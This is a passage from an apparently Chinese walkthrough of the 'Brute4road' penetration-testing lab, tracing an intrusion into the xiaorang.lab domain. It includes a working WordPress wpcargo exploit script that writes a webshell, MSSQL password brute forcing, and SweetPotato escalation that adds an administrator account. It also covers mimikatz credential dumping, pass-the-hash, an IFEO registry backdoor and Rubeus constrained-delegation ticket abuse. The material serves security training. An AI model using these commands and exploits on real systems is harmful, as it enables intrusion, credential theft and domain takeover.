172.22.2.34</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-04-16 15:24:34] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[<span class="built_in">print</span>$ IPC$]</span><br><span class="line">[2025-04-16 15:24:35] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-04-16 15:24:36] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-04-16 15:24:42] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器 </span><br><span class="line">172.22.2.7   Redis                    已拿下</span><br><span class="line">172.22.2.34  XIAORANG\CLIENT01</span><br><span class="line">172.22.2.3    DC:DC.xiaorang.lab</span><br><span class="line">172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>看见wp，直接开扫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18 --api-token</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/18.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/19.png"></p>
+<p>直接搜索，拿exp打</p>
+<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.format(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.<span class="built_in">join</span>([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    f<span class="string">&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    f<span class="string">&quot;&#123;destination_url&#125;webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/20.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/21.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/22.png"></p>
+<p>挂载代理后访问，发现攻击成功</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/23.png"></p>
+<p>蚁剑直接连接成功</p>
+<p>wp的话 一般会直接在配置文件直接写下数据库的账号密码</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/24.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wpuser&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;WpuserEha8Fgj9&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/25.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/26.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/27.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/28.png"></p>
+<p>拿下flag02</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c757e423-eb44-459c-9c63-7625009910d8&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>:::info<br>**172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器 **</p>
+<p><strong>172.22.2.7   Redis                    已拿下</strong></p>
+<p><strong>172.22.2.34  XIAORANG\CLIENT01</strong></p>
+<p><strong>172.22.2.3    DC:DC.xiaorang.lab</strong></p>
+<p><strong>172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 已拿下</strong></p>
+<p>:::</p>
+<p>发现还写了一些我可能会感兴趣的东西</p>
+<p>还写了是密码，说明可能是密码本，同时信息收集得知还有一台mssql</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/29.png"></p>
+<p>把限制20条去掉，直接导出</p>
+<p>我们也知道mssql的账号为sa</p>
+<p>这里我们尝试爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q hydra -l sa -P password.txt mssql://172.22.2.16</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我用hydra没爆破成功</p>
+<p>那么我们用tscan和fscan试试</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/30.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/31.png"></p>
+<p>爆破成功，得多试几次</p>
+<p>使用MDUT二开版连接成功</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/32.png"></p>
+<p>再次信息收集</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/33.png"></p>
+<p>发现拥有<font style="color:rgb(255, 182, 0);">SeImpersonatePrivilege权限</font></p>
+<p>那么可以使用土豆进行提权</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/34.png"></p>
+<p>激活一下组件</p>
+<p>上传</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/35.png"></p>
+<p>这里发现攻击成功 但是执行命令不回显（复盘发现其实不是MDUT的问题，是exp的问题）</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/36.png" alt="复盘时的图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;netstat -ano&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/37.png"></p>
+<p>使用哥斯拉重新弄</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/38.png"></p>
+<p>还是这样</p>
+<p>才发现，这个exe不可以回显</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;net user Hundredsu qwer123! /add&quot;</span></span><br><span class="line"></span><br><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;net localgroup administrators Hundredsu /add&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>那就不管了，直接增加用户rdp</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/39.png"></p>
+<p>还是失败</p>
+<p>最后发现是<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato/blob/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe"><font style="color:rgb(240, 246, 252) !important;">SweetPotato</font></a><font style="color:rgb(240, 246, 252) !important;">的问题</font></p>
+<p><font style="color:rgb(240, 246, 252) !important;">这里试了n个SweetPotato</font></p>
+<p><font style="color:rgb(240, 246, 252) !important;">终于成功了</font></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/40.png"></p>
+<p>直接翻文件</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/41.png"></p>
+<p>:::info<br><strong>172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器  已拿下</strong></p>
+<p><strong>172.22.2.7   Redis                    已拿下</strong></p>
+<p><strong>172.22.2.34  XIAORANG\CLIENT01</strong></p>
+<p><strong>172.22.2.3    DC:DC.xiaorang.lab</strong></p>
+<p><strong>172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 已拿下</strong></p>
+<p>:::</p>
+<p>已经拿到域内的主机了，就可以尝试能不能成功横向DC了</p>
+<p>传mimikatz</p>
+<p>以本地管理员权限的powershell打开就可以了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line"><span class="built_in">log</span> 1.txt  <span class="comment">#将hash记录在1.txt，方便查找</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/42.png"></p>
+<p>记得管理员权限</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/43.png"></p>
+<p>抓取到hash，尝试各种横向，但是都没成功</p>
+<p>接下来的工具 注意使用的角色</p>
+<p><strong>信息收集</strong></p>
+<p>由于前面各种横向都没成</p>
+<p>那么接下来探针一下，是否可以进行<strong>委派攻击</strong></p>
+<p>下面这条命令使用 <code>MSSQLSERVER$</code> 账户的 NTLM 哈希值来模拟该账户的凭据，从而在本地系统上运行 PowerShell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:MSSQLSERVER$ /domain:xiaorang.lab /ntlm:2f09fa55bd93e0be3c9d6cc3a617ad56 /run:powershell</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有一种方法可以以机器账户的身份登录的就是使用镜像劫持</p>
+<p>也就是放大镜提权</p>
+<p>管理员运行cmd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>然后锁定屏幕，点击放大镜就可以获取system的cmd</p>
+<p>收集判断是否为约束委派账户，需要在机器账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/44.png"></p>
+<p>我打的时候没成功，这里贴一张suuu师傅的展示一下使用过程</p>
+<p>另一种探测是否存在可以利用委派攻击的账户</p>
+<p>放大镜提权后</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/45.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p>由上面可以发现 <code>MSSQLSERVER$</code> 机器配置了到 DC LDAP 和 CIFS 服务的约束性委派</p>
+<p>接下来进行约束委派攻击</p>
+<p>将Rubeus.exe传上去</p>
+<p>接下来就不需要系统用户了，就是不需要在域内的用户的权限执行了</p>
+<p>在rdp好操作一些</p>
+<p>直接使用本地的administrator的powershell开始操作</p>
+<ol>
+<li><strong>第一步</strong>使用 <a target="_blank" rel="noopener" href="https://c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%9F%9F%E5%86%85%E6%AD%A6%E5%99%A8%E5%8C%96%E5%B7%A5%E5%85%B7.html#6._Rubeus_0">Rubeus</a> 与 <code>MSSQLSERVER$</code> 的凭证向<strong>KDC</strong>(密钥分发中心)申请一个<strong>TGT</strong>(票据授权票据) 并用base64格式打印出来</li>
+</ol>
+<p><strong>rc4处为前面获取到的ntlm的hash</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:2f09fa55bd93e0be3c9d6cc3a617ad56 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Hundredsu\Desktop&gt; ./Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:2f09fa55bd93e0be3c9d6cc3a617ad56 /domain:xiao</span><br><span class="line">rang.lab /dc:DC.xiaorang.lab /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using rc4_hmac <span class="built_in">hash</span>: 2f09fa55bd93e0be3c9d6cc3a617ad56</span><br><span class="line">[*] Building AS-REQ (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;xiaorang.lab\MSSQLSERVER$&#x27;</span></span><br><span class="line">[*] Using domain controller: 172.22.2.3:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2W21boNNI6Xggx1qNfILZAwIBcPsYFvjsYwpUFxTo89hY+X/GUyb8KqWuIB1ef9fsR2x9iwYBVlb7uOfGlNKdMRmIeNUsmrZlRUl4r6kPj/mdA7AlQhFOYeQN9/7ngSaa9pspAWDTDwjN3r7gviKy+m2LarXcWHiebYlN5WlpXAJ5/ep3HggxjVLM0TtnrBYgyu2vDrtdqhpf5IOVrhtY+mqsZmtaCvqDoegMSEP2txk3MoowO2HjKaGGUDewPDyKmKY8MFsH3CxQ+0bY98kYBFuJPNt5FxwNoHYfELMbq50d0Tatn4O2LHgrXwqlfFC4opfjOQP6gX63pX1lF8/VzE47AVKtH0X0/Rd6ugKk/XW93BwH5KgU9HWE9868VDpLUs3RzN8hJ8/u5FuvD7ymPCCOViUBD2omeDUfT0JrPCft6ZISNQR5WtMSAdf1Zg44sgBjpTWm4l+45fVIT/gNR4bwU2rTIr0PTidE+vxsF4nu1m2WxzSukCc4BUoc6iZfLHu51PjZkOiVQbN3bxqFTl/NEnTn7O/J4L/vyH03kxIU/yS70Db7DKa0q8mTRmNUo99OlutDQm064RYBumx9u8dbIPKd/yBLEtterJNBTZUO36Jgu4uHwbWxReb+CvNeluO0YfrkO5eMVtdAcX7yS5Pxq38mEW8ujA+Rhl77f4gVHsXgaIe362OZD44ZhPrWP3R+1M6togXqktMKtId4DyGehqvwrJTbwqTcaiMuAk87XMl1r6JkZGqF9gD9iLbSH1Iiqt/w/ybUy4S9q+DwaTOFof3gDzkRagtngBbor+nt4JiLPq9a7TY0B3Y/jVky0SQH0eLIqFCNVz523YE8hXboPCyZLAMAFnM7sX8SJ46zpf4i8N5tRTRHRvUC/oWW4UyNzFEONG350XvVrD4+KTtxO55Xvl5D0rsw/vlZTqTnDoUNgCyTScX28EcEsEd8dWmu3NbZDD9XfhxKtOUDuB1yjYcHumbG243amptxbAnYJY5HKb1FoZFqyibutvjibUaiXenWdvmOx3qWYPy+L/VgWta0GP2gmelfMW7qiA3i1v2oLg3Z8dUC6YAgXGj6Rn0CV4Lr/t0/KRPrZFjkIahStIC6tkVV2QC5p/cNcenKVcWUVdqaqrnqb+xHCbIfInsF02mDZeg2C0SJPR85e1TKvN26VwcdWtsrwp774rwEnnAEsmhHuNqd7PDcOS0as3KOPx5zBWXrytJKL2L5Gv1g0pqZ0bagqK2yVPj6GuWPJ3d3zeTeh55+lUd76tJ9SNyYUtynWit1j1a2Tv5I4dAIcqLQJ5btFxBz5wgbyHnfg0X8c82HGvJA/wwSzgFSga9pByLwImeTijf8lFt3tbOyiRDjnpNEVPhPpmWfSMmAVghUuLSKwlfqMvWJsNKvx96X4GtSTn3/aBmOhMMV+mGUE+xY0KjkVlvTjgGxGDYhcjBuObk0ao3EozRWjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDEaZuQGw9Yw9uEC7sTXx4GoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDQxNjEwNTA0NlqmERgPMjAyNTA0MTYyMDUwNDZapxEYDzIwMjUwNDIzMTA1MDQ2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/xiaorang.lab</span><br><span class="line">  ServiceRealm             :  XIAORANG.LAB</span><br><span class="line">  UserName                 :  MSSQLSERVER$</span><br><span class="line">  UserRealm                :  XIAORANG.LAB</span><br><span class="line">  StartTime                :  2025/4/16 18:50:46</span><br><span class="line">  EndTime                  :  2025/4/17 4:50:46</span><br><span class="line">  RenewTill                :  2025/4/23 18:50:46</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  xGmbkBsPWMPbhAu7E18eBg==</span><br><span class="line">  ASREP (key)              :  2F09FA55BD93E0BE3C9D6CC3A617AD56</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ol start="2">
+<li><strong>第二步</strong>使用上面获取到的TGT去申请一个ST</li>
+</ol>
+<p>具体的原理</p>
+<p>然后通过 <code>S4u2seflt</code> 拓展协议使用 <strong>TGT</strong> 向 <strong>TGS</strong>(票据授予服务器) 请求代表 <strong>Administrator</strong> 用户访问 <strong>DC.xiaorang.lab</strong> 上的 <strong>LDAP 服务</strong> 的 <strong>ST</strong>(服务票据)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0JsDD5zUc3St0yTDHf5rguciA8UqJCJ2VtLblTGwGqqKIVfod7A+fBG3FGg6ma2BlmYzSiBJY/EeWDfFJLzRRGvLmWOWpJUMl0nxfZgnSBabSyResFise8cIga28gxMU2BrxgJs6gi5FcjWw9rrLOkg4SPkcNHpGx+x3o1hF85ZxvpFLfV527rhFa1QMdjFAsh3op1XCEPabj5hTPYHZ4ojnev/KODXAlq1a032B0+MmDGLL3/310yLVytaCMXjtp52vURZNOb9oMrvJ2aQdA1ReImiLRUNzESEaImU6mVrEDDoMdhOwftVVOa9zXbIn9SKMcSbvotw9A8IW/DGHg965r9zCRvzHahy8OYPsoo2GLrkQtUePOcZXRMd07Sm2R1A2t2IdQ3PAgwm4hzcTkzJB6uTotR/3gUxYs7UaB/8WiujNl8TSKdgmzXhmNGg0GJL8kVix7Kb1ahi3aFwTY0fSFXIUlMJsfpqfC6LEpa+mqooCbxIt0w0VbRbR/9lqJEoFcrjvGGkWBOLbPkgvpcDjjwvzOgnIPIFRO6ab0pACbFws/T0qaKxm3iX3649cW77aLTtESHs1ICEmKpFO6xFoqQO3w46I+mWCtIylccgIBl/qLnuBiSABX1kjE+LDRqTomb7T3IWnWTMcC4YG8mfGisPwiFqz0U8oJX70WFVoYEIz0dE1BQ3f22umGltramUeIFGQiREDi6Keo1mrReZP0pBnL1pyLPQtN8iybX0nwYxPYSdDve6QW6XizNKv9uwHy5lp8PNXB60l35qE962zm99Hn421tdjn3etmH1hGEOUIIh3d/0IQGpAnWuxljiWLE5oU+eoBu4mnxU4P68YUGfnlXl1LYc4alre8bhcjjO3DNAyPAqtFTPxrmXQmEUDPeJ5fzTYol15Cc0QpQWrcdV/0RTNMke8Cawh1tz/bCEMwz2QvZwQSVoVJnDEG77TMn0OJaSgGQC79wbRkd+Qn6GtAEvogI0vlJBwTzaC96Os6FGb9a+tZWr0uyZwPBfLb+e3/Q5JzCrlF6lu7H9uiKzBYF6LeycLqlFhxTtDsuYsKQzmNbveZPX663ZU5hb6qADVog8sFnUQhGfhq1LUFbXV2/DUve67kvc1wHpd1qkGEtl0ANC2dMPbwamf1wOG9gydvcqsmsL2vI9gCchki4hHKjNly7NFOB7V7cKy1OnkK0+/J5wjNJ/axZm9SpepVcVMFdvTniUQvgNSB+/IzupQRTzw6RmutU2Ph5Qom3TnuFu1Y+Js1cCHIm8A/sH5YMSDwkTYRwFotPkoR6wQAg5y3DAZM7kbmz/01BeKgl736pdO5lXwcoQNR8wbL1p/sXrAXiEh/rU/aVgX0FFxu5lL5xgF8/owcpUU2xL9N3cL8O592Oxo35RzLNkYQp7f1lpBSFYMsT16QPQJgo4WjFYGQ7GEfybWrLkqqwzJ2bMTqMy93tj6Jjie0KjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBD/kTsJOka4ypAtAz0I6mKmoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDQxNjEwNTc0NlqmERgPMjAyNTA0MTYyMDU3NDZapxEYDzIwMjUwNDIzMTA1NzQ2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/46.png"></p>
+<p>然后使用mimikatz抓取管理员的密码</p>
+<p>这里重新用本地管理员的运行mimikatz，使用Dcsync抓取域管的hash</p>
+<blockquote>
+<p><strong>原理——DCSync攻击（主副域控同步）</strong></p>
